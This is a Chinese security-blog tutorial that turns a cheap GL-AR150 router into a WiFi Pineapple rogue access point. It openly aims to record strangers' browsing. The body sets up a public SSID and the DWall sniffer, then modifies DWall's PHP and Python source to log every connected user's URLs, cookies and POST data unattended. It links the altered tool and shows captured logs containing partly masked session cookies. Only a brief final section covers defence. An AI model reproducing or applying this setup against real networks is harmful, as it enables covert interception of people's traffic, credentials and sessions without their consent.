> 最近在研究路由器封包拦截的拦截、过滤和还原，先后接触了ARP、DNS、中间人和Hijack等攻击手段。 hak5有一款WiFi Pineapple
> NANO的路由器，已经集成了很多攻击功能在里面，所以也就起了探索一下这个大菠萝的想法。  
>

 **本文主要介绍利用自己现有的设备，如何制作和使用WiFi
Pineapple镜像网络流量，利用DWall模块分析用户数据，然后根据自己的需求，给DWall加入了日志记录功能。最后介绍了如何防范wifi
pineapple这样的网络设备。**

 ****

#  **自己打造一个WiFi pineApple：**

看到很多前辈们已经做出了WiFi Pineapple NANO的rom文件，我也准备利用现有的设备，刷一个WiFi Pineapple NANO系统试试。

###  **Openwrt：**  

WiFi Pineapple系统是一个把openwrt重度改良过的系统，所以需要先了解一下openwrt：

> OpenWrt 可以被描述为一个嵌入式的 Linux 发行版，（主流路由器固件有 dd-> wrt,tomato,openwrt三类）而不是试图建立一个单一的、静态的系统。OpenWrt的包管理提供了一个完全可写的文件系统，从应用程序供应商提供的选择和配置，并允许您自定义的设备，以适应任何应用程序。
>
>
> OpenWRT是一个高度模块化、高度自动化的嵌入式Linux系统，拥有强大的网络组件和扩展性，常常被用于工控设备、电话、小型机器人、智能家居、路由器以及VOIP设备中。

### ****\WiFi Pineapple NANO:**  
**

它不是一个简单的广播客户端，也不只是一个路由器或接入点。WiFi Pineapple
NANO是一个功能强大的无线网络审计工具，利用其独特的硬件和直观的Web界面与你的渗透测试流程整合。它适合装在你的口袋里。WiFi Pineapple
NANO拥有一个完全重新设计的Web界面，有助于推进工作流程，增加了可用性。

按照现代的标准，新的WiFi
Pineapple的Web界面更加直观、快速、灵敏和熟悉。模块仍然是一个核心功能，可无线下载社区开发的附加组件和网络前端的流行工具。新的API对于经验丰富的开发人员和新来的人是非常简单的。新的WiFi
Pineapple的Android应用程序简化了USB网络连接共享。点击连接即时连接到漂亮友好的新的移动Web界面。不需要Root。在客户现场长期部署？没有问题。将WiFi
Pineapple NANO插入一个标准的USB电源适配器和用于远程维护的基于USB调制解调器最新一代的LTE连接设备即可。

配置如下：  

> CPU: 400 MHz MIPS Atheros AR9331 SoC
>
> Memory: 16 MB ROM, 64 MB DDR2 RAM
>
> Disk: ROM + Micro SD (not included)
>
> Wireless: Atheros AR9331 + Atheros AR9271, both IEEE 802.11 b/g/n
>
> Ports: (2) RP-SMA Antenna, Ethernet over USB (ASIX AX88772A), USB 2.0 Host,
> Micro SD
>
> Power: USB 5V 1.5A. Includes USB Y-Cable
>
> Configurable Status Indicator LED, Configurable Reset Button
>
> 某宝的价格：RMB：318.00

## 结合GL-AR150的迷你路由器：

#### 配置如下：

> Powered by Atheros 9331 SoC, 400MHz CPU
>
> 150Mbps high speed
>
> 16MB RAM
>
> Stable performance
>
> OpenWrt pre-installed
>
> 使用充电宝当电源
>
> 使用U盘来扩充容量
>
> 某宝的价格：RMB：119.00

## 刷机：  

### 准备：

> \- 下载打包好的支持AR-150路由器的wifipineapple的rom。
> [AR150-wifipine固件下载](https://github.com/yearnwang/pineapple-ar150)
> ,注意这个固件只适合AR-150使用，其他路由器不兼容。
>
> \- 备份现有路由器版本的ROM。

### 开始刷机：

以下2种方法任选一种：

> \- 可以使用路由器自带的升级功能进行刷机（**推荐使用**）。
>
> \- 把rom文件上传到路由器，然后执行刷机命令，等待完成，中间不要断电。
    
    
    mtd -r write /tmp/xxxx.rom firmware 

刷完机后，在浏览器地址栏输入：172.16.42.1:1471后，应该可以进入大菠萝的设置页面

### 进入设置页面：  

![路由器改成WiFi
Pineapple系统镜像网络流量，利用DWall模块智能分析用户访问数据](https://image.3001.net/images/20180328/15222329473984.jpg!small)  

### 设置上网功能：

设置wan口为dhcp：

    
    
    vim /etc/config/network
    config interface 'wan'
            option ifname 'eth0'
            option proto 'dhcp'
            option dns '119.29.29.29, 8.8.8.8'

### 使用sd卡给设备扩容：

u盘必须是ex4格式的，需要用linux格式化u盘

    
    
    config global
    option anon_swap '0'
    option anon_mount '0'
    option auto_swap '1'
    option auto_mount '1'
    option delay_root '5'
    option check_fs '0'
    config mount
    option target '/sd'
    option device '/dev/sda1'
    option fstype 'auto'
    option options 'rw,sync'
    option enabled '1'

以后所有的程序就都可以安装到sd卡中了。

## DWall功能：

> Display's HTTP URLs, Cookies, POST DATA, and images from browsing clients.

 **分析封包的主要目的，就是要查看别人的访问记录，和一些敏感信息；DWall这个模块已经集成了我想要的功能。**

###  **WIFI pineapple 最佳实践：**

> 1 打开自己的wifipineApple，设置公开的SSID;
>
> 2 打开流量镜像功能，防止漏网之鱼，我插了个64G的U盘来记录应该是足够用了）  
>

![路由器改成WiFi
Pineapple系统镜像网络流量，利用DWall模块智能分析用户访问数据](https://image.3001.net/images/20180328/15222327011429.jpg!small)

3 确认有人已经连接：  

4 打开DWall模块：

5 查看用户访问过的内容；  

修改源码:  

### DWall优点：

可以免去我们去分析封包，而且过滤出敏感字段，省去我们的不少麻烦。

### DWall缺点:

需要一直在这个页面不能离开,才可以看到用户从路由器上发出的请求数据。

进入ssh，用ps查看进程列表：root@gl_ar150:/sd/modules/DWall/log# ps | grep DWall ，
发现其实DWall一直在后天台运行，只是没有在后台显示而已，那个start listen按钮只是控制在不在后台显示；
我想作者不在后台一直显示，应该是考虑到内存问题吧；

    
    
    2483 root     12092 S N  /usr/bin/python /pineapple/modules/DWall/assets/DWall.py   ==>开了一个9999的websocket端口,进行数据处理
    2484 root      3072 S N  /pineapple/modules/DWall/assets/http_sniffer br-lan    ===>http数据监听

### DWall模块代码是开源的，我准备根据自己的需求，修改一下源码，让他可以自动记录log，这样当我不在的时候，也不至于错过一些重要的数据信息。

打开DWall/api/module.php 加入：

    
    
    $time = time();	====》 获取到当前时间
            $date = date("ymdHis",$time);  ====》 格式化时间为
            $date = $date.".log";          ====》 加入.log后缀名
    //打印日志输出到文件
            $this->execBackground("/usr/bin/python /pineapple/modules/DWall/assets/DWall.py > /pineapple/modules/DWall/log/".$date);  
    

收到封包数据后，会进入DWall/assets/WebSocketsHandler.py：  

    
    
      def parseData(self, data):
            data = data.split("|", 2)
            dataDict = {"from": data[0], "to": data[1]}
            path, headers = data[2].split('\r\n', 1)
            payload = Message(StringIO(headers))
            url = "http://" + payload['host'] + path.split(" ")[1]
            if url.lower().endswith(('.png', '.ico', '.jpeg', '.jpg', '.gif', '.svg')):
                dataDict['image'] = url	===》记录图片
            else:
                dataDict['url'] = url	===》记录地址
            if 'cookie' in payload:
                dataDict['cookie'] = payload['cookie']===》记录cookie
            postData = data[2].split('\r\n\r\n')
            if len(postData) == 2:
                if postData[1].strip():
                    dataDict['post'] = postData[1]	=====》post的数据
    print dataDict;	========》

我加入了一条打印命令，用来记录日志用：

    
    
            return dataDict

log文件中记录内容如下，这个大家应该都明白是什么意思：）

    
    
    {'url': 'http://t.wg.360-api.cn/ap/tips/browse?mid=2ea1cddeb1140c584e2af3fdd9f70e22', 'to': 'xxx.xxx.xxx.xxx', 'from': '172.16.42.192
    {'url': 'http://s.360.cn/360game/stat.htm?pid=se&m=2ea1cddeb1140c584e2af3fdd9f70e22&ver=9.0.7.1033&s=loading&type=extyouxi&sever=9.1
    {'url': 'http://wan.360.cn/?src=se', 'to': 'xxx.xxx.xxx.xxx', 'from': 'xxx.xxx.xxx.xxx', 'cookie': '__huid=11K07bgNFwCnhAAu7BlaPTAx5Xov
    {'url': 'http://seupdate.360safe.com/bankmode4.ini?1842861343', 'to': '61.240.140.61', 'from': '172.16.42.192'}
    {'to': '42.236.102.95', 'image': 'http://p0.qhimg.com/t016d59f245a828b8e3.jpg', 'from': '172.16.42.192'}
    {'to': 'xxx.xxx.xxx.xxx', 'image': 'http://p6.yx-s.com/t01321f78ebe6c390bf.jpg', 'from': '172.16.42.192'}
    {'to': 'xxx.xxx.xxx.xxx', 'image': 'http://p6.yx-s.com/t01dfc19ebeec81e26f.jpg', 'from': '172.16.42.192'}
    {'to': 'xxx.xxx.xxx.xxx', 'image': 'http://p6.yx-s.com/t01e46f85933f369ab6.jpg', 'from': '172.16.42.192'}
    {'to': 'xxx.xxx.xxx.xxx', 'image': 'http://p6.yx-s.com/t0188118c4beb970f46.jpg', 'from': '172.16.42.192'}
    {'to': '120.52.32.31', 'image': 'http://p0.qhimg.com/t016d59f245a828b8e3.jpg', 'from': '172.16.42.192'}
    {'to': 'xxx.xxx.xxx.xxx', 'image': 'http://p6.yx-s.com/t01cd2fd2aa60ffd533.jpg', 'from': '172.16.42.192'}
    {'to': 'xxx.xxx.xxx.xxx', 'image': 'http://p6.yx-s.com/t014f83608163d71015.jpg', 'from': '172.16.42.192'}
    {'url': 'http://js.passport.qihucdn.com/5.0.3.js', 'to': '42.236.102.95', 'from': '172.16.42.192'}

### 查看log文件列表格式：

    
    
    		root@gl_ar150:/sd/modules/DWall/log# ls -la
    
    
    drwxr-xr-x    2 root     root          4096 Mar 26 19:30 .
    drwxr-xr-x    6 111      118           4096 Mar 23 19:11 ..
    -rw-r--r--    1 root     root             0 Mar 23 20:17 180323121756.log
    -rw-r--r--    1 root     root       1568871 Mar 26 11:29 180323121836.log
    -rw-r--r--    1 root     root         16384 Mar 26 19:30 180326112942.log
    -rw-r--r--    1 root     root         28673 Mar 26 19:31 180326113030.log

经过上面的修改以后，只要开机后点击Enable，DWall就会自动记录用户的每条访问记录，在需要时候，只需要在LOG文件中查找就可以了。

[DWall修改版本下载地址](https://github.com/yearnwang/wifipineaplle_dwall_log)  

## 如何防范：

如果把WiFi Pineapple比喻成一座魔窟，那么当你连接上这个WiFi后，无疑就等于进入了魔窟的大门，你的一举一动，都将会被记录和利用。
那么，有没有办法进行防范呢？

>   * 在公共场所，少使用或不使用陌生wifi；
>   * 少登录或不登录http网站，因为目前对https网站的攻击还是比较有限的；
>   * 查看自己的内网ip地址是不是172.16.42.1的网关,如果是那么你可能就中招了；
>   * 在不熟悉的网络环境操作时候，使用VPN或者SSL通道加密，这样就是截取流量，也是加密后的流量，分析起来比较复杂
>

 ***本文作者：yearnwang，转载请注明来自 FreeBuf.COM**

